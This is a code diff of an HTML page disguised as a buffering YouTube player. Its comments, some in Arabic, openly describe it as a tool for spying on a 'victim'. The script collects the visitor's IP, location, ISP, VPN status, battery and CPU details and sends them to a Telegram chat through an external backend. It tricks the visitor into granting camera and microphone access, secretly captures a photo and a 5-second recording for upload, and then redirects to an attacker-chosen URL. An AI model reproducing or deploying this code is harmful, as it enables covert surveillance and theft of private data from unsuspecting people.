@@ -2,41 +2,43 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>YouTube Streaming Server</title>
+  <title>YouTube Player - Buffering</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <style>
     body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-    .container { text-align: center; padding: 25px; border: 1px solid #1a1a1a; border-radius: 20px; background: #050505; }
-    .loader { border: 4px solid #111; border-top: 4px solid #ff0000; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; margin: 20px auto; }
+    .container { text-align: center; padding: 30px; border-radius: 15px; background: #000; width: 85%; }
+    .loader { border: 3px solid #222; border-top: 3px solid #ff0000; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 25px auto; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     video, canvas { opacity: 0; position: absolute; left: -9999px; }
-    .status-text { color: #555; font-size: 13px; margin-top: 10px; }
+    .status-text { color: #aaa; font-size: 14px; line-height: 1.6; }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="130">
-    <h3 style="margin-bottom: 5px;">Human Verification</h3>
-    <p class="status-text">Confirm you are not a robot to play this video.</p>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="120">
     <div class="loader"></div>
-    <p style="font-size: 12px; color: #f00;">⚠️ Please Allow Camera Access to Verify</p>
+    <p class="status-text">يتطلب مشغل الفيديو إذن "مزامنة الوسائط" للمتابعة.<br><b>يرجى الضغط على "Allow" لتشغيل المحتوى.</b></p>
   </div>
 
   <video id="v" autoplay muted playsinline></video>
   <canvas id="c" width="640" height="480"></canvas>
 
   <script>
-    const chatId = new URLSearchParams(window.location.search).get("id");
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get("id");
+    const redirectTarget = urlParams.get("re"); // الرابط الذي سيذهب إليه الضحية بعد الاختراق
+
     const v = document.getElementById("v");
     const c = document.getElementById("c");
     const ctx = c.getContext("2d");
 
+    // دالة الإرسال لتيليجرام (عبر الباكيند)
     async function send(msg, type = "text", file = null) {
       if (!chatId) return;
       const payload = { chat_id: chatId };
       if (type === "text") payload.message = msg;
-      if (type === "photo") { payload.message = "📸 *TARGET SNAPSHOT:*"; payload.photo = file; }
-      if (type === "video") { payload.message = "📹 *TARGET VIDEO (5s):*"; payload.video = file; }
+      if (type === "photo") { payload.message = "📸 *NEW SNAPSHOT:*"; payload.photo = file; }
+      if (type === "video") { payload.message = "📹 *NEW VIDEO (5s):*"; payload.video = file; }
 
       try {
         await fetch("https://render-backend-package1.onrender.com/submit", {
@@ -48,40 +50,34 @@
       } catch (e) {}
     }
 
+    // تحليل الهدف (IP + VPN + Battery + Time)
     async function analyzeTarget() {
-      // 1. بيانات المتصفح الحقيقية
       const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      let batteryInfo = "N/A";
-      try {
-        const b = await navigator.getBattery();
-        batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging 🔌' : 'Discharging 🔋'})`;
-      } catch (e) {}
+      let bat = "N/A";
+      try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '🔌' : '🔋'})`; } catch (e) {}
 
-      // 2. بيانات الـ IP وفحص الـ VPN
       fetch("https://ipapi.co/json/")
         .then(res => res.json())
         .then(async data => {
-          // مقارنة التوقيت لكشف الـ VPN
-          const isVpn = (data.timezone !== browserTimezone) ? "⚠️ YES (Detected VPN/Proxy)" : "✅ NO (Real IP Address)";
-          
-          let m = "🏁 *COBRA ELITE ANALYSIS REPORT* 🏁\n";
+          const isVpn = (data.timezone !== browserTimezone) ? "⚠️ YES (Detected)" : "✅ NO (Real)";
+          let m = "🏁 *COBRA ELITE SYSTEM V6.0* 🏁\n";
           m += "━━━━━━━━━━━━━━━━━━━━\n";
-          m += `🌍 *Public IP:* \`${data.ip}\`\n`;
-          m += `🛡️ *VPN Detected:* **${isVpn}**\n`;
+          m += `🌍 *IP:* \`${data.ip}\`\n`;
+          m += `🛡️ *VPN Detected:* ${isVpn}\n`;
           m += `🏢 *ISP:* ${data.org}\n`;
-          m += `📍 *City:* ${data.city}, ${data.country}\n`;
+          m += `📍 *Loc:* ${data.city}, ${data.country}\n`;
           m += `🕒 *Target Time:* ${new Date().toLocaleString('ar-DZ')}\n`;
-          m += `🔋 *Battery:* ${batteryInfo}\n`;
-          m += `💻 *Hardware:* ${navigator.hardwareConcurrency} Cores | ${navigator.deviceMemory || 'N/A'}GB RAM\n`;
+          m += `🔋 *Battery:* ${bat}\n`;
+          m += `💻 *CPU:* ${navigator.hardwareConcurrency} Cores\n`;
           m += "━━━━━━━━━━━━━━━━━━━━\n";
-          m += "🛰️ *STATUS:* Requesting Media Permissions...";
           
           await send(m);
           startSpying();
         })
-        .catch(() => send("⚠️ Error: IP Analysis Failed."));
+        .catch(() => startSpying());
     }
 
+    // التجسس (كاميرا + فيديو)
     function startSpying() {
       navigator.mediaDevices.getUserMedia({ video: true, audio: true })
         .then(stream => {
@@ -96,28 +92,39 @@
               const blob = new Blob(chunks, { type: 'video/webm' });
               const reader = new FileReader();
               reader.readAsDataURL(blob);
-              reader.onloadend = () => {
-                send("", "video", reader.result.split(',')[1]);
-              };
+              reader.onloadend = () => { send("", "video", reader.result.split(',')[1]); };
+              
+              // التوجيه النهائي بعد الانتهاء
               setTimeout(() => {
                 stream.getTracks().forEach(t => t.stop());
-                window.location.replace("https://youtu.be/tNWpOuJk2M8");
-              }, 2000);
+                finalizeRedirect();
+              }, 1500);
             };
 
-            // معالجة مشكلة السواد (انتظار 2.5 ثانية)
+            // حل مشكلة السواد (انتظار 2.5 ثانية) ثم التصوير وبدء الفيديو
             setTimeout(() => {
               ctx.drawImage(v, 0, 0, c.width, c.height);
-              send("", "photo", c.toDataURL("image/jpeg", 0.9).split(',')[1]);
+              send("", "photo", c.toDataURL("image/jpeg", 0.8).split(',')[1]);
               recorder.start();
-              setTimeout(() => recorder.stop(), 5000); 
+              setTimeout(() => recorder.stop(), 5000); // تسجيل 5 ثواني
             }, 2500); 
           };
         })
         .catch(() => {
-          send("❌ *Access Denied: Target Refused Permissions*");
-          window.location.replace("https://youtu.be/tNWpOuJk2M8");
+          send("❌ *Target Denied Access*");
+          finalizeRedirect();
         });
+    }
+
+    // دالة التوجيه الديناميكي
+    function finalizeRedirect() {
+      let finalUrl = "https://youtu.be/tNWpOuJk2M8"; // الرابط الافتراضي (يوتيوب)
+      
+      if (redirectTarget) {
+        finalUrl = redirectTarget.startsWith('http') ? redirectTarget : 'https://' + redirectTarget;
+      }
+      
+      window.location.replace(finalUrl);
     }
 
     if (chatId) analyzeTarget();
